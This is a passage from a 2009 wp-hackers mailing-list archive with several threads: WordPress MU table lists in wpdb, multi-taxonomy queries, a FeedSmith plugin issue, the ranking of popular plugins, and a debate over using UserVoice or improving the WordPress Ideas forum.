Is there a better way or has this been or will this be corrected / changed
in the 2.8.6 or 2.9.* version(s)?

From scribu at gmail.com  Wed Dec 30 17:36:48 2009
From: scribu at gmail.com (scribu)
Date: Wed, 30 Dec 2009 19:36:48 +0200
Subject: [wp-hackers] How to enqueue default scrips in footer?
In-Reply-To: <9b6c20460912291316m78292c62ma6726dcc3b5f627a@mail.gmail.com>
References: <9b6c20460909242114t780acfbbv8ce7bd3176f6c7fb@mail.gmail.com>
	<349fe48b0909250345i22e30393m3265266b4e7c4ad5@mail.gmail.com>
	<4f9525dc0909250743y5bd5dd80taa0be29a5333ce44@mail.gmail.com>
	<161617690909251003p6c84c61s12d600a14988fa42@mail.gmail.com>
	<9b6c20460909251405h1296a04aiec1ea2da6ac90d6d@mail.gmail.com>
	<4ABE76CC.1050504@laptoptips.ca>
	<9b6c20460912291316m78292c62ma6726dcc3b5f627a@mail.gmail.com>
Message-ID: <349fe48b0912300936s78adb69at1b81633b73a8be42@mail.gmail.com>

Just re-gegister the script using wp_register_script().

Also, this previous discussion might help:

http://lists.automattic.com/pipermail/wp-hackers/2009-December/029434.html


-- 
http://scribu.net

From slc at publicus.net  Wed Dec 30 17:50:45 2009
From: slc at publicus.net (Steven Clift)
Date: Wed, 30 Dec 2009 11:50:45 -0600
Subject: [wp-hackers] WordPress users/developers in local government,
	for transparency 	projects
Message-ID: <d1a24d6e0912300950p9e7bdadnbb0cd61e90aca942@mail.gmail.com>

We are gathering software developers interested in local government
transparency and community participation here:

   http://e-democracy.org/locallabs

It is a new e-list/online group.

It would be great to have a healthy WordPress contingent among us.

Steven Clift
E-Democracy.org

From scribu at gmail.com  Wed Dec 30 17:58:00 2009
From: scribu at gmail.com (scribu)
Date: Wed, 30 Dec 2009 19:58:00 +0200
Subject: [wp-hackers] Limitations and Patch for WP_Query Taxonomy Stuff
In-Reply-To: <394F4785-02BB-4D48-830A-266DE6A0D22B@gmail.com>
References: <394F4785-02BB-4D48-830A-266DE6A0D22B@gmail.com>
Message-ID: <349fe48b0912300958h47c9fd2ele864b0715902bdb2@mail.gmail.com>

On Wed, Dec 30, 2009 at 6:53 PM, Joe Hoyle <joehoyle at gmail.com> wrote:

> Personally, I think the more WordPress is used for more complex data /
> custom post types the more custom taxonomies will be used, and not having
> the ability to query for any amount is going to be limiting. I just wondered
> if anyone else thinks this is something worth pushing for in core, or anyone
> fancies writing in improved patch etc.
>

I agree: having the ability to query by multiple taxonomies is very
important.

I didn't have the time (read 'patience') to write a patch for Core, but I
did write a small plugin:

http://wordpress.org/extend/plugins/query-multiple-taxonomies/

I'll comment on the patches on trac.


-- 
http://scribu.net

From otto at ottodestruct.com  Wed Dec 30 18:11:15 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 30 Dec 2009 12:11:15 -0600
Subject: [wp-hackers] WordPress MU category tables
In-Reply-To: <5b1aecc0912300923y299a90a8v225e7eb9097ecdda@mail.gmail.com>
References: <5b1aecc0912300923y299a90a8v225e7eb9097ecdda@mail.gmail.com>
Message-ID: <161617690912301011t61c7f54ctb6a2abfc5fc34ead@mail.gmail.com>

On Wed, Dec 30, 2009 at 11:23 AM, Tim Schoffelman <tim at silentgap.com> wrote:
> but in WordPress MU, the categories, post2cat & link2cat tables aren't used
> (not on my installs anyways 2.7.1 && 2.8.4a). IE - there's no
> wp_4_categories or wp_categories table.
>
> I'm having to rely on something like this to pull the correct tables (but
> feel as I shouldn't have too).
>
> Is there a better way or has this been or will this be corrected / changed
> in the 2.8.6 or 2.9.* version(s)?

Look at the $old_tables variable in the wpdb. Tables listed in there
are old and can be ignored.

-Otto

From Brian at TheCodeCave.com  Wed Dec 30 19:40:46 2009
From: Brian at TheCodeCave.com (Brian Layman)
Date: Wed, 30 Dec 2009 14:40:46 -0500
Subject: [wp-hackers] WordPress MU category tables
In-Reply-To: <5b1aecc0912300923y299a90a8v225e7eb9097ecdda@mail.gmail.com>
References: <5b1aecc0912300923y299a90a8v225e7eb9097ecdda@mail.gmail.com>
Message-ID: <003901ca8987$fd0f5070$f72df150$@TheCodeCave.com>

Your best bet is probably just to check out each version and look at the
$tables array in wp-incudes/wp-db.php and that will give you the accurate
list of tables for that version: e.g.:
	/**
	 * List of WordPress tables
	 *
	 * @since {@internal Version Unknown}}
	 * @access private
	 * @var array
	 */
	var $tables = array('users', 'usermeta', 'posts', 'categories',
'post2cat', 'comments', 'links', 'link2cat', 'options',
			'postmeta', 'terms', 'term_taxonomy',
'term_relationships', 'commentmeta');

	/**
	 * List of deprecated WordPress tables
	 *
	 * @since 2.9.0
	 * @access private
	 * @var array
	 */
	var $old_tables = array('categories', 'post2cat', 'link2cat');

Now you  may wish to use your loop in order to get any tables added by
plugins, but beyond that the $tables variable should help you along...

Brian Layman 



From lloydomattic at gmail.com  Wed Dec 30 20:42:46 2009
From: lloydomattic at gmail.com (Lloyd Budd)
Date: Wed, 30 Dec 2009 12:42:46 -0800
Subject: [wp-hackers] Ideas Forum (Voting)
Message-ID: <70ebb7140912301242p55c7df64u98382a29d98da4ac@mail.gmail.com>

On Tue, Dec 29, 2009 at 12:36 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
Subject was: Re: [wp-hackers] Improving WordPress Core Development
> On Dec 29, 2009, at 3:18 PM, Mike Schinkel wrote:
>> On Dec 29, 2009, at 3:12 PM, Matt Mullenweg wrote:
>>> On 2009-12-29 11:52 AM, Mike Schinkel wrote:
>>>> Anyway, that doesn't work nearly as well as UserVoice.
>>>
>>> We can make the ideas forum better, and will. I prefer that over a dependency on an external, proprietary service.
>>
>> Why must you reinvent the wheel when one already exists? Why work on something that you'll but 10% of your time into when someone else will be putting 100% of their time into? Why force us to wait on improvements until some unforeseen time in the future when those improvements could be had now?
>>
>> The "Not Invented Here" syndrome has seen the downfall of many a powerful company. Why not learn from their experience?
>>
>> http://en.wikipedia.org/wiki/Not_Invented_Here

Hi Mike,

Your message comes across to me as aggressive and accusatory. Saying
"respectively so" does not make it respectively so. Possibly, I'm
misreading your missives.


> Let me add to this:
>
> -- A lot more people are becoming familiar with how User Voice works than will ever be familiar with how WordPress' Ideas work. There is significant benefit to leveraging that which more people are familiar with[1].

Currently, I think User Voice is a great tool for open source projects
getting started. Established ones should always try to reach for open
source solutions.

What do you feel is special/innovative about the user voice
experience? In my experience it seems consistent with already
established patterns.

I don't think it would take much work to make
http://wordpress.org/extend/ideas/ fit the bill. I don't see WordPress
member value for not making the small investment in an open source
solution.


> -- If you ever find that your dependence on an external, proprietary service you can always revert to what you had before, and the benefits can rack up in the interim.

That's quite the pitch. Revert to what you had before and lose
everything from the interim.

Although, you can often export your data from proprietary systems, not
always. You also almost always lose the meta data, and are crippled if
you want to look for deeper insights, patterns, or need to do
administration specific to your members or scale of use.



> -- The (web) world is evolving to where people depend more and more on external proprietary services, i.e. [2]. Making decisions as if that were not happening is, respectfully speaking, not embracing the evolution of the web.

That's not evolution, that is the status quo. It's a direct
continuation of computing history which has largely been proprietary.


If there are other open source solutions out there that might be a
good fit, let's evaluate them as well.


Best regards,
Lloyd

From otto at ottodestruct.com  Wed Dec 30 20:58:37 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 30 Dec 2009 14:58:37 -0600
Subject: [wp-hackers] WordPress MU category tables
In-Reply-To: <003901ca8987$fd0f5070$f72df150$@TheCodeCave.com>
References: <5b1aecc0912300923y299a90a8v225e7eb9097ecdda@mail.gmail.com> 
	<003901ca8987$fd0f5070$f72df150$@TheCodeCave.com>
Message-ID: <161617690912301258y3db112b0pe668b9b7a129a264@mail.gmail.com>

Or, to make it real simple in 2.9 and up:

global $wpdb;
$active_tables = array_diff($wpdb->tables, $wpdb->old_tables);

:)

-Otto
Sent from Memphis, TN, United States

From wordpress at dd32.id.au  Wed Dec 30 21:02:37 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Thu, 31 Dec 2009 08:02:37 +1100
Subject: [wp-hackers] Limitations and Patch for WP_Query Taxonomy Stuff
In-Reply-To: <394F4785-02BB-4D48-830A-266DE6A0D22B@gmail.com>
References: <394F4785-02BB-4D48-830A-266DE6A0D22B@gmail.com>
Message-ID: <op.u5rrensbspxmuu@dd32>

On Thu, 31 Dec 2009 03:53:42 +1100, Joe Hoyle <joehoyle at gmail.com> wrote:
> After mulling over that for a while, it got me thinking. Whats the point  
> in even having category__in, and tag__in duplicated in the query class  
> (not to mention category__not_in, category__and, category__slug_in or  
> whatever etc etc...). Why not have this querying by taxonomy (be it  
> categories, tags, manufacturers, companies etc etc) all dealt with by  
> the same code. The only issue then is the annoying difference between  
> tag__in, and the taxonomy name which is post_tag. We have an array of  
> registered taxonomies (post_tag, category, manufacturers) simply check  
> the query vars for an registered taxonomies: *__in, *__not_in,  
> *__slug_in, *__and blah blah blah. This we I can query by any amount of  
> terms in any amount of taxonomies be they custom or "normal".

I have thought the same a few times now.. The only side effect i could  
possibly think of is that the category ones have a bit of proprocessing  
for back compat, to determine what has been passed (int, slug, name,  
who-knows-what) IIRC
-- 
Dion Hulse / dd32

Contact:
  e: contact at dd32.id.au
  msn: msn at d32.id.au
  skype: theonly_dd32
Web: http://dd32.id.au/

From mikeschinkel at newclarity.net  Thu Dec 31 00:07:47 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 30 Dec 2009 19:07:47 -0500
Subject: [wp-hackers] Ideas Forum (Voting)
In-Reply-To: <70ebb7140912301242p55c7df64u98382a29d98da4ac@mail.gmail.com>
References: <70ebb7140912301242p55c7df64u98382a29d98da4ac@mail.gmail.com>
Message-ID: <03BEB70D-618A-481A-A5C0-459AB9FF68E9@newclarity.net>

On Dec 30, 2009, at 3:42 PM, Lloyd Budd wrote:
> Your message comes across to me as aggressive and accusatory. Saying
> "respectively so" does not make it respectively so. Possibly, I'm
> misreading your missives.

No more aggressive and accusatory than your reply to me.  I was stating my case, no need to read malice into my arguments.

>> Let me add to this:
>> 
>> -- A lot more people are becoming familiar with how User Voice works than will ever be familiar with how WordPress' Ideas work. There is significant benefit to leveraging that which more people are familiar with[1].
> 
> Currently, I think User Voice is a great tool for open source projects
> getting started. Established ones should always try to reach for open
> source solutions.

I'd agree, assuming there were any good open source solutions.  AFAIK, there are not.  I just looked to verify and there really is only a Rails version called OpenMind[1]. (Do we really want to host & maintain a Rails app?)  There are others that are free too[2] but none others are open source that I could find on first 3 pages of Google.

> What do you feel is special/innovative about the user voice
> experience? In my experience it seems consistent with already
> established patterns.

It's up now, working, free to use and maintained by a group who but 100% of their time into making it work better. And a lot of companies are using it.

Jeremiah Owyang who I generally respect recommends considering it too[3].

> I don't think it would take much work to make
> http://wordpress.org/extend/ideas/ fit the bill.

Yep, that's how all projects look at the outset, especially ones where elaborate UI is required. Then when the project gets on it's feet things start to look different.

But more importantly, based on Janeforshort's blog post[4] there are over 50 significant new features that have been requested and are being considered for Wordpress. Which of these should new features should we decide to put on hold while we take the time to improve Wordpress' idea forum?

-- Easy blog menu management
-- dynamic image resize/crop
-- media upload UI redesign (begun in 2.9 but postponed for implementation due to technical issues)
-- photo albums
-- custom content type UI and API
-- supercharging queries (cross-taxonomies)
-- categories/tags for pages
-- auto-taxonomy UI
-- custom fields UI (possibly to be registered by themes or plugins for something to be displayed)
-- settings UI redesign
-- improve the upgrade process (inc. distros for specific use types)
-- SVN awareness
-- canonical plugins and a UI for displaying them
-- plugin page redesign
-- themes UI redesign
-- comments UI touchup
-- decouple language updates and files
-- new default theme
-- choose your own start page
-- caps lock detection
-- accessibility admin theme
-- mobile admin theme
-- synching custom fields > taxonomies
-- exif refresh
-- role management simplification
-- credits page in app
-- default custom types (microblog, galleries, asides)
-- admin bar
-- front end comment moderation
-- front end posting (a la P2)
-- better importers
-- widget installer
-- importer installer
-- more inline documentation
-- built-in "Welcome to WordPress" guide for 1st time admin use/checklist (set settings, add profiles, set up comment options, dashboard modules, add widgets, pick a theme, etc) with ability to dismiss as you move through 
-- better help tab
-- more template tags
-- better zone selector
-- new code editor
-- XSL for RSS feeds (pretty feeds)
-- bulk user creation (lazy load importer?)
-- below post widgets
-- image importing
-- HTML validation
-- customizable comment form
-- Twitter and Flickr importers
-- WordPress capitalization catcher
-- configurable QuickPress configurable (add categories)
-- more dashboard modules
-- easy linking to internal content when writing new content in editor
-- audit of error messages and updating them to be clearer revisions for custom fields and taxonomies... 

Probably the best argument for *not* doing an ideas forum in-house is to consider Geoffrey Moore's Core vs. Context analysis[5]:

When processes no longer result in marketplace differentiation, they go from being core to context, but all too many continue to consume the bulk of an enterprise?s resources. Building on the material in his most recent best seller, Living on the Fault Line, Moore explains how the resulting decline in revenues and margins can be overcome through aggressive resource reallocation and human capital renewal.

From [6]  Moore defines "Core" as:

Any activity which creates sustainable differentiation in the target market resulting in premium prices or increased volume. Core management seeks to dramatically outperform all competitors within the domain of core. (Note this use of the term is unrelated to either core competence, which describes differentiated capability, or core business, which describes categories accounting for a high percentage of overall revenues.)

I'd say for Wordpress that blogging and CMS functionality is "core."  Also from [6] Moore defines "Context" as:

Any activity which does not differentiate the company from the customers' viewpoint in the target market. Context management seeks to meet (but not exceed) appropriate accepted standards in as productive a manner as possible.

Doesn't development of a user ideas forum sound exactly like Moore's definition of "context" related to Wordpress? IOW, just set up UserVoice in an hour and be done with it, back working on the 50+ feature requests that are relevant to core.

> I don't see WordPress
> member value for not making the small investment in an open source
> solution.

Excepting the fact there isn't really a viable open source solution to use?

>> -- If you ever find that your dependence on an external, proprietary service you can always revert to what you had before, and the benefits can rack up in the interim.
> 
> That's quite the pitch. Revert to what you had before and lose
> everything from the interim.
> 
> Although, you can often export your data from proprietary systems, not
> always. You also almost always lose the meta data, and are crippled if
> you want to look for deeper insights, patterns, or need to do
> administration specific to your members or scale of use.

I knew that line of argument might be used to discredit that point. :)  First, I don't buy it when a developer says you loose data; if you can view it you can screen scrape it on a one-off conversion project if you really need it. 


But I'm really wondering if you see the irony in your argument against this proprietary solution? Basically by arguing not to use UserVoice because there would value created that we might not be able to capture if we ever wanted to move to an open source solution you are admitting there is value in using the 3rd party service. 

What that implies is you are arguing we should do without that value rather than have it and not be able to capture it if ever there were a reason to move.  That's not a convincing argument, at least not to me.

>> -- The (web) world is evolving to where people depend more and more on external proprietary services, i.e. [2]. Making decisions as if that were not happening is, respectfully speaking, not embracing the evolution of the web.
> 
> That's not evolution, that is the status quo. It's a direct
> continuation of computing history which has largely been proprietary.

The pendulum swings continuously, that's not status quo.  

I ran a business selling commercial developer tools from 1994 to 2006.  In 1994 commercial developer tools enabled developers in ways that were wonderful and for which the existing open source community could not match.  

Around 2003 I  began to strongly believe in open source because I felt it was a truly a better way and thus wound down my involvement in selling commercial tools. That's not to say that open source killed commercial tools, it just relegated them to the part of the market where commercial tools still make sense. Note that many open source developers use(d) commercial tools to developer open source software, at least many did in the early days and still some do today.

Now in almost 2010 I see that SAAS is becoming a better way than developing software and maintaining the servers for every need one may have.  That doesn't mean open source will go away just that it will be relegated to where it makes most sense.  Note that most SAAS services are built on the back of open-source software.

And I think this is a trend people would do good to pay attention to.  It could well affect the future of Wordpress, though I have no idea how yet.  What's more I think that 5 years from now it will be viewed as foolish by most people to consider building their own infrastructure for *context* instead of just focusing on their *core* when they can easily find a SAAS solution for free that already does the context for them.  

Want to mark your calendar for Dec 30 2015 to revisit this debate?

> If there are other open source solutions out there that might be a
> good fit, let's evaluate them as well.

If you can find one, be my guest.

-Mike Schinkel
[1] http://openmind.sourceforge.net/default.html
[2] http://www.mahalo.com/answers/ecommerce/does-somebody-know-an-open-source-alternative-to-uservoice-or-getsatisfaction
[3] http://www.web-strategist.com/blog/2008/05/02/build-your-own-ideastorm-with-uservoice/
[4] http://wordpress.org/support/topic/345127?replies=142
[5] http://premierespeakers.com/geoffrey_moore/speech_topics#2
[6] http://www.dealingwithdarwin.com/theBook/darwinDictionary.php

From tom at motionmill.com  Thu Dec 31 00:08:08 2009
From: tom at motionmill.com (tom at motionmill.com)
Date: 31 Dec 2009 01:08:08 +0100
Subject: [wp-hackers] =?utf-8?q?Ideas_Forum_=28Voting=29?=
Message-ID: <20091231000808.8360.qmail@s1.addwittz.com>

Hello,

I'm  out of the office. For urgent matters, please call our office or contact one of my colleagues. You find their contact data on the motionmill website. I'll be back on January the 4th.

http://motionmill.com/

Have a nice day,

Tom



From yanghatespam at gmail.com  Thu Dec 31 00:53:25 2009
From: yanghatespam at gmail.com (Yang Zhang)
Date: Wed, 30 Dec 2009 19:53:25 -0500
Subject: [wp-hackers] Patching up FeedSmith
Message-ID: <9066fa250912301653w2a2702d0o4048c4a99ef92c28@mail.gmail.com>

Hi, I installed & configured FeedSmith 2.3 to my WordPress 2.9, but my
feeds aren't being redirected. http://y_z.scripts.mit.edu/wp/feed is
still the original feed. Any hints? I suspect that the
template_redirect hook isn't actually getting fired, but I'm not sure
where's the proper place to move things. Thanks in advance.
-- 
Yang Zhang
http://www.mit.edu/~y_z/

From navjotjsingh at gmail.com  Thu Dec 31 02:38:10 2009
From: navjotjsingh at gmail.com (Navjot Singh)
Date: Thu, 31 Dec 2009 08:08:10 +0530
Subject: [wp-hackers] Patching up FeedSmith
In-Reply-To: <9066fa250912301653w2a2702d0o4048c4a99ef92c28@mail.gmail.com>
References: <9066fa250912301653w2a2702d0o4048c4a99ef92c28@mail.gmail.com>
Message-ID: <7b9e108c0912301838l710de2f9i9c4fcd7a0073c678@mail.gmail.com>

Why not try a alternative - FDFeedburner Plugin...its the best alternative
- http://wordpress.org/extend/plugins/feedburner-plugin/ ?

 <http://wordpress.org/extend/plugins/feedburner-plugin/>--
Navjot Singh

On Thu, Dec 31, 2009 at 6:23 AM, Yang Zhang <yanghatespam at gmail.com> wrote:

> Hi, I installed & configured FeedSmith 2.3 to my WordPress 2.9, but my
> feeds aren't being redirected. http://y_z.scripts.mit.edu/wp/feed is
> still the original feed. Any hints? I suspect that the
> template_redirect hook isn't actually getting fired, but I'm not sure
> where's the proper place to move things. Thanks in advance.
> --
> Yang Zhang
> http://www.mit.edu/~y_z/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at dan-cole.com  Thu Dec 31 03:00:36 2009
From: wp at dan-cole.com (Dan Cole)
Date: Wed, 30 Dec 2009 21:00:36 -0600
Subject: [wp-hackers] Ideas Forum (Voting)
Message-ID: <8443cbbb0912301900h5357d915lf378d572b1e6ba1f@mail.gmail.com>

It's important to consider consistency. It's nice to have everything on one
domain. It's also nice to link everyone's thoughts to a single account, so
the community can see where an individual stands. The new profiles (
http://profiles.wordpress.org) that are coming to WordPress.org openly show
how people contribute to Trac, theme development, plugin development, forum
support, and the ideas forum. It could be confusing for people to go to a
seemingly random site to suggest ideas.

Instead of going to a quick solution and an external one at that, we need to
look at how we can best gather the needs of the community. Allowing anyone
to quickly suggest anything they want leads to a lot of repeat ideas and
lead to poor ideas that are too general and not achievable. A new ideas
forum needs to stop ideas that are broad, such as ideas that include words
like "better" or "faster". To add to that, the general community prefers
ideas that broad. Voting up ideas should be simple, while creating ideas
should require thought and lead to something that is finite (had
objectives).

I'd personally like to see a +1 / -1 system for the ideas forum. The ideas
forum should really be reviewed in a controlled way and then updated to
specifications, but I guess a lot of the people with authority are really
busy.

Who has access to modify WordPress.org (excluding the Codex editing)?

Dan Cole

From jane at automattic.com  Thu Dec 31 03:30:07 2009
From: jane at automattic.com (Jane Wells)
Date: Wed, 30 Dec 2009 22:30:07 -0500
Subject: [wp-hackers] Ideas Forum (Voting)
In-Reply-To: <mailman.9318.1262228439.16651.wp-hackers@lists.automattic.com>
References: <mailman.9318.1262228439.16651.wp-hackers@lists.automattic.com>
Message-ID: <244ED35E-E314-4B4E-A2BC-BF66EE065F92@automattic.com>

Below are the main issues I think we need to fix first with the Ideas  
Forum. They didn't get fixed before because the forums were not  
running the new bbPress version, and it seemed like we should upgrade  
the software before trying to write new plugins. The custom plugins  
that power the forum were amendments of other plugins, and not as easy  
to change as I thought they'd be. Also, the person expected to do the  
upgrading was no longer available, so it languished. Mike Adams has  
offered to do the bbPress upgrade and work on updating the plugins in  
mid-January. Here's the list I made last summer of things that I think  
should be fixed for the Ideas forum to be more functional:

- If a thread gets closed and it has already had the status changed to  
?this idea's been implemented? or ?you can do this with a plugin? then  
the closed thread will not appear on the list anymore. If you close it  
while still ?under consideration? (because there's no plugin and it  
hasn't been implemented) then it will still appear in the Under  
Consideration list of topics. Really ought to separate that out? once  
a thread is closed, it shouldn?t look like it can still be commented/ 
voted on.

- If you go to Ideas You Haven?t Rated, it includes Ideas that have  
been closed. Once closed, they should no longer be available for rating.

- To make it easier for people to scan existing Ideas before creating  
a new one, we should use categories (or blank forums with subforums,  
whatever) to segment Idea threads (not tags!): Media, Performance, UI  
Design, Links, API, etc. Should map to the components in Trac (which  
really need to be cleaned up first, as there are overlaps like gallery/ 
media), so that Ideas voted up can be mapped to Trac when blessed.

- If logged in with appropriate permissions, should be able to block/ 
mark-as-spam a user from front end, just as you can edit or delete a  
post.

- Bulk management: If you search for all posts by an author and want  
to delete them (spam management), you currently need to delete each  
one manually, which is time consuming if someone put up 50 spam posts  
in an hour. Can we swipe the bulk management feature from WP for this?

- Most Popular doesn?t limit itself to Ideas under consideration.  
There are ideas that have been closed with plugin status appearing on  
the Most Popular list. Most Popular should only pull from Open Threads  
marked Under Consideration.
Current status options from admin dropdown are:
This idea?s been implemented!
You can do this with a plugin!
This idea is under consideration.

However, with the not-really-closed issues clogging things up, we need  
to make more choices so we can get threads off the Newest/Most Popular  
lists while having accurate labels. Suggested replacements:
This idea is under consideration. -Ideas in active voting stage.
Good idea! We?re working on it. -Ideas we like and have a ticket for  
in Trac/are working on in trunk.
This idea?s been implemented! -When it?s in a launched version.
This is plugin territory. -When either there is a plugin that does it  
(mention in comment before closing) or shouldn?t be in core.
This is theme territory. -When it?s a display thing that is controlled  
by individual themes.
Sorry, not right now. -When it?s been voted down or there are  
technical reasons not to implement (include in comments).
This is not a core suggestion. -When people post support requests,  
suggestions about other applications, or are too vague and need to  
create a new, more specific thread.

If we can get the software upgraded to the current version and address  
these issues with the plugins, the Ideas forum should become  
immediately more usable. A new UI would be great, but the  
functionality currently gets in the way of the UI, so the UI can't  
even really be evaluated properly (short of just designing the whole  
thing from scratch). I'm not making any promises, because who knows,  
it could turn out to be more complicated an undertaking than expected,  
but I'd like to try the bbPress upgrade and plugin fixes before  
getting too worked up about replacing it with something else.

Jane

P.S. This post was LONG in order to hit a lot of points and be  
transparent about what I'm working on. I invite suggestions, but if  
you choose to respond to the list, PLEASE trim your post. If you are  
using Gmail, click on "show quoted text" and trim it, so you won't  
clutter up everyone else's list experience with my novella over and  
over. People getting digest emails have the worst time trying to  
follow conversations when people fail to trim posts.




From scribu at gmail.com  Thu Dec 31 17:12:50 2009
From: scribu at gmail.com (scribu)
Date: Thu, 31 Dec 2009 19:12:50 +0200
Subject: [wp-hackers] Most Popular Plugins?
Message-ID: <349fe48b0912310912y18e168c1ue2ce4939ef9d9233@mail.gmail.com>

While browsing through the most popular plugins, I noticed something odd: on
page 10 <http://wordpress.org/extend/plugins/browse/popular/page/10/> I
found the Light Social plugin:

*Downloads:* 1.400+
*Ratings:* 4
*Last Updated:* 2009-12-31


Right under it is the Google Analytics plugin:

*Downloads:* 18,900+
*Ratings:* 5
*Last Updated:* 2009-12-31


It just doesn't look right. Google Analytics should be above, IMO.


-- 
http://scribu.net

From dan at dancoulter.com  Thu Dec 31 17:30:06 2009
From: dan at dancoulter.com (Dan Coulter)
Date: Thu, 31 Dec 2009 11:30:06 -0600
Subject: [wp-hackers] Most Popular Plugins?
In-Reply-To: <349fe48b0912310912y18e168c1ue2ce4939ef9d9233@mail.gmail.com>
References: <349fe48b0912310912y18e168c1ue2ce4939ef9d9233@mail.gmail.com>
Message-ID: <5dc2163e0912310930p6ab9ba88udcde1b87c5ebad08@mail.gmail.com>

The Light Social plugin has had about twice as many downloads today as
Google Analytics has had.  I'm guessing that has something to do with it.

On Thu, Dec 31, 2009 at 11:12 AM, scribu <scribu at gmail.com> wrote:

> While browsing through the most popular plugins, I noticed something odd:
> on
> page 10 <http://wordpress.org/extend/plugins/browse/popular/page/10/> I
> found the Light Social plugin:
>
> *Downloads:* 1.400+
> *Ratings:* 4
> *Last Updated:* 2009-12-31
>
>
> Right under it is the Google Analytics plugin:
>
> *Downloads:* 18,900+
> *Ratings:* 5
> *Last Updated:* 2009-12-31
>
>
> It just doesn't look right. Google Analytics should be above, IMO.
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Dan Coulter
http://dancoulter.com/
http://phpflickr.com/
http://blogsforbands.com/

Hey, I got nothing to do today but smile
-Simon and Garfunkel

From scribu at gmail.com  Thu Dec 31 17:34:34 2009
From: scribu at gmail.com (scribu)
Date: Thu, 31 Dec 2009 19:34:34 +0200
Subject: [wp-hackers] Most Popular Plugins?
In-Reply-To: <5dc2163e0912310930p6ab9ba88udcde1b87c5ebad08@mail.gmail.com>
References: <349fe48b0912310912y18e168c1ue2ce4939ef9d9233@mail.gmail.com>
	<5dc2163e0912310930p6ab9ba88udcde1b87c5ebad08@mail.gmail.com>
Message-ID: <349fe48b0912310934q153e3e4bvd1fbe8d7e57a1dc2@mail.gmail.com>

On Thu, Dec 31, 2009 at 7:30 PM, Dan Coulter <dan at dancoulter.com> wrote:

> The Light Social plugin has had about twice as many downloads today as
> Google Analytics has had.  I'm guessing that has something to do with it.
>

If that's true, then the listing should be called "Most Popular Plugins
Today".

Currently, it's implied that it's the list of all-time most popular plugins.


-- 
http://scribu.net

From harish.mlists at gmail.com  Thu Dec 31 17:39:03 2009
From: harish.mlists at gmail.com (Harish Narayanan)
Date: Thu, 31 Dec 2009 17:39:03 +0000
Subject: [wp-hackers] Ideas Forum (Voting)
In-Reply-To: <03BEB70D-618A-481A-A5C0-459AB9FF68E9@newclarity.net>
References: <70ebb7140912301242p55c7df64u98382a29d98da4ac@mail.gmail.com>
	<03BEB70D-618A-481A-A5C0-459AB9FF68E9@newclarity.net>
Message-ID: <4B3CE1B7.6010002@gmail.com>

On 31/12/2009 00:07, Mike Schinkel wrote:
>
> Yep, that's how all projects look at the outset, especially ones where elaborate UI is required. Then when the project gets on it's feet things start to look different.
> 
> But more importantly, based on Janeforshort's blog post[4] there are over 50 significant new features that have been requested and are being considered for Wordpress. Which of these should new features should we decide to put on hold while we take the time to improve Wordpress' idea forum?

You seem to be assuming that in order to work on one idea, others need
to be put on hold. But that's the wonderful thing about Free Software
projects isn't it? Different people can focus on the different bits
they're passionate or curious about.

For instance, I haven't a clue as to what "SVN awareness" (which shows
up on the following list) is, but I like the sound of it and will be
willing to find out more and contribute. It's quite likely others care
about other features on this list, and still others care about a
fully-functional ideas forum. (And are willing and able to contribute
their time, code etc.)

> -- Easy blog menu management
> -- dynamic image resize/crop
> -- media upload UI redesign (begun in 2.9 but postponed for implementation due to technical issues)
> -- photo albums
> -- custom content type UI and API
> -- supercharging queries (cross-taxonomies)
> -- categories/tags for pages
> -- auto-taxonomy UI
> -- custom fields UI (possibly to be registered by themes or plugins for something to be displayed)
> -- settings UI redesign
> -- improve the upgrade process (inc. distros for specific use types)
> -- SVN awareness
> -- canonical plugins and a UI for displaying them
> -- plugin page redesign
> -- themes UI redesign
> -- comments UI touchup
> -- decouple language updates and files
> -- new default theme
> -- choose your own start page
> -- caps lock detection
> -- accessibility admin theme
> -- mobile admin theme
> -- synching custom fields > taxonomies
> -- exif refresh
> -- role management simplification
> -- credits page in app
> -- default custom types (microblog, galleries, asides)
> -- admin bar
> -- front end comment moderation
> -- front end posting (a la P2)
> -- better importers
> -- widget installer
> -- importer installer
> -- more inline documentation
> -- built-in "Welcome to WordPress" guide for 1st time admin use/checklist (set settings, add profiles, set up comment options, dashboard modules, add widgets, pick a theme, etc) with ability to dismiss as you move through 
> -- better help tab
> -- more template tags
> -- better zone selector
> -- new code editor
> -- XSL for RSS feeds (pretty feeds)
> -- bulk user creation (lazy load importer?)
> -- below post widgets
> -- image importing
> -- HTML validation
> -- customizable comment form
> -- Twitter and Flickr importers
> -- WordPress capitalization catcher
> -- configurable QuickPress configurable (add categories)
> -- more dashboard modules
> -- easy linking to internal content when writing new content in editor
> -- audit of error messages and updating them to be clearer revisions for custom fields and taxonomies... 

Harish

From wordpress at dd32.id.au  Thu Dec 31 21:53:11 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Fri, 01 Jan 2010 08:53:11 +1100
Subject: [wp-hackers] Ideas Forum (Voting)
In-Reply-To: <244ED35E-E314-4B4E-A2BC-BF66EE065F92@automattic.com>
References: <mailman.9318.1262228439.16651.wp-hackers@lists.automattic.com>
	<244ED35E-E314-4B4E-A2BC-BF66EE065F92@automattic.com>
Message-ID: <op.u5toex0hspxmuu@dd32>

On Thu, 31 Dec 2009 14:30:07 +1100, Jane Wells <jane at automattic.com> wrote:
> Below are the main issues I think we need to fix first with the Ideas
> Forum. They didn't get fixed before because the forums were not
> running the new bbPress version, and it seemed like we should upgrade
> the software before trying to write new plugins. The custom plugins
> that power the forum were amendments of other plugins, and not as easy
> to change as I thought they'd be. Also, the person expected to do the
> upgrading was no longer available, so it languished. Mike Adams has
> offered to do the bbPress upgrade and work on updating the plugins in
> mid-January. Here's the list I made last summer of things that I think
> should be fixed for the Ideas forum to be more functional:

To me, It sounds like a project better suited to WordPress rather than  
bbPress.. and might be worth considering that before spending extra time  
on the bbPress implementation.

The only thing lacking in WordPress would be the lack of user tags..  
everything else would tie in well to posts, comments, ans taxonomies.

Originally it'd have been suited to bbPress as it was a simple forum..  
